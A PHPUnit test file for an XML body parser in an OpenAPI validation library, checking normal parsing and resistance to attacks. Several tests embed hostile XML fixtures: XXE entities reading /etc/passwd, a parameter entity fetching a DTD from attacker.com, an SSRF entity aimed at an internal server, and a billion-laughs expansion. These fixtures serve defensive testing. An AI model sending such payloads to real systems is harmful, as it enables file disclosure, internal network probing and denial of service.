<?php

declare(strict_types=1);

namespace Duyler\OpenApi\Tests\Validator\Request\BodyParser;

use Duyler\OpenApi\Validator\Request\BodyParser\XmlBodyParser;
use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\TestCase;

use function is_array;
use function is_string;

/** @internal */
final class XmlBodyParserTest extends TestCase
{
    private XmlBodyParser $parser;

    protected function setUp(): void
    {
        $this->parser = new XmlBodyParser();
    }

    #[Test]
    public function xxe_external_entity_blocked(): void
    {
        $xxePayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
XML;

        $result = $this->parser->parse($xxePayload);

        if (is_array($result)) {
            $this->assertStringNotContainsString('root:', (string) ($result['root'] ?? ''));
            $this->assertStringNotContainsString('/bin/bash', (string) ($result['root'] ?? ''));
        } else {
            $this->assertStringNotContainsString('root:', $result);
            $this->assertStringNotContainsString('/bin/bash', $result);
        }
    }

    #[Test]
    public function xxe_parameter_entity_blocked(): void
    {
        $xxePayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
XML;

        $result = $this->parser->parse($xxePayload);

        if (is_array($result)) {
            $this->assertArrayNotHasKey('xxe', $result);
        }

        $this->assertTrue(is_array($result) || is_string($result));
    }

    #[Test]
    public function billion_laughs_attack_handled(): void
    {
        $billionLaughs = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>
XML;

        $memoryBefore = memory_get_usage();
        $result = $this->parser->parse($billionLaughs);
        $memoryAfter = memory_get_usage();
        $memoryIncrease = $memoryAfter - $memoryBefore;

        $this->assertLessThan(10 * 1024 * 1024, $memoryIncrease, 'Billion laughs attack should not cause memory exhaustion');
        $this->assertTrue(is_array($result) || is_string($result));
    }

    #[Test]
    public function valid_xml_parsed_correctly(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<user>
    <name>John Doe</name>
    <email>john@example.com</email>
    <age>30</age>
</user>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
        $this->assertArrayHasKey('name', $result);
        $this->assertArrayHasKey('email', $result);
        $this->assertArrayHasKey('age', $result);
        $this->assertSame('John Doe', $result['name']);
        $this->assertSame('john@example.com', $result['email']);
        $this->assertSame('30', $result['age']);
    }

    #[Test]
    public function empty_xml_returns_empty_string(): void
    {
        $result = $this->parser->parse('');

        $this->assertSame('', $result);
    }

    #[Test]
    public function whitespace_only_returns_empty_string(): void
    {
        $result = $this->parser->parse('   ');

        $this->assertSame('', $result);
    }

    #[Test]
    public function invalid_xml_returns_raw_body(): void
    {
        $invalidXml = '<root><unclosed>';

        $result = $this->parser->parse($invalidXml);

        $this->assertSame($invalidXml, $result);
    }

    #[Test]
    public function nested_xml_parsed_correctly(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<company>
    <department name="Engineering">
        <employee>
            <name>Alice</name>
            <role>Developer</role>
        </employee>
    </department>
</company>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
        $this->assertArrayHasKey('department', $result);
    }

    #[Test]
    public function xml_with_attributes_parsed(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<user id="123" status="active">
    <name>John</name>
</user>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
        $this->assertArrayHasKey('name', $result);
        $this->assertSame('John', $result['name']);
    }

    #[Test]
    public function xxe_ssrf_blocked(): void
    {
        $xxeSsrf = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server.local/secret">
]>
<root>&xxe;</root>
XML;

        $result = $this->parser->parse($xxeSsrf);

        if (is_array($result)) {
            $this->assertStringNotContainsString('secret', (string) ($result['root'] ?? ''));
        } else {
            $this->assertStringNotContainsString('secret', $result);
        }
    }

    #[Test]
    public function xml_with_cdata_parsed(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<message>
    <content><![CDATA[<script>alert('xss')</script>]]></content>
</message>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
        $this->assertArrayHasKey('content', $result);
    }

    #[Test]
    public function xxe_no_file_disclosure(): void
    {
        $xxePayload = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
XML;

        $result = $this->parser->parse($xxePayload);

        $resultString = is_array($result) ? json_encode($result) : $result;
        $this->assertStringNotContainsString('root:x:0:0', $resultString ?: '');
        $this->assertStringNotContainsString('/bin/bash', $resultString ?: '');
    }

    #[Test]
    public function xml_with_only_text_content(): void
    {
        $xml = '<?xml version="1.0" encoding="UTF-8"?><root>simple text content</root>';

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
    }

    #[Test]
    public function xml_with_mixed_content(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<parent>
    text before
    <child>child content</child>
    text after
</parent>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
    }

    #[Test]
    public function xml_with_numeric_values(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<data>
    <int>42</int>
    <float>3.14</float>
    <string>hello</string>
</data>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
        $this->assertArrayHasKey('int', $result);
        $this->assertArrayHasKey('float', $result);
        $this->assertArrayHasKey('string', $result);
    }

    #[Test]
    public function xml_with_empty_elements(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<data>
    <empty></empty>
    <selfclosing/>
</data>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
    }

    #[Test]
    public function xml_special_characters_handled(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<data>
    <ampersand>&amp;</ampersand>
    <lessthan>&lt;</lessthan>
    <greaterthan>&gt;</greaterthan>
    <quote>&quot;</quote>
    <apostrophe>&apos;</apostrophe>
</data>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
    }

    #[Test]
    public function deeply_nested_xml_handled(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<level1>
    <level2>
        <level3>
            <level4>
                <level5>deep value</level5>
            </level4>
        </level3>
    </level2>
</level1>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
    }

    #[Test]
    public function xml_with_unicode_content(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<data>
    <chinese>中文测试</chinese>
    <emoji>😀🎉</emoji>
    <russian>Привет мир</russian>
</data>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
        $this->assertArrayHasKey('chinese', $result);
        $this->assertArrayHasKey('emoji', $result);
        $this->assertArrayHasKey('russian', $result);
    }

    #[Test]
    public function xml_with_duplicate_element_names(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user>Alice</user>
    <user>Bob</user>
    <user>Charlie</user>
</users>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
    }

    #[Test]
    public function xml_declares_wrong_encoding_returns_raw(): void
    {
        $xml = '<?xml version="1.0" encoding="UTF-8"?><root>' . "\xFF\xFE" . '</root>';

        $result = $this->parser->parse($xml);

        $this->assertTrue(is_array($result) || is_string($result));
    }

    #[Test]
    public function xml_with_namespace_parsed(): void
    {
        $xml = <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:ns="http://example.com">
    <ns:element>namespaced content</ns:element>
</root>
XML;

        $result = $this->parser->parse($xml);

        $this->assertIsArray($result);
    }
}
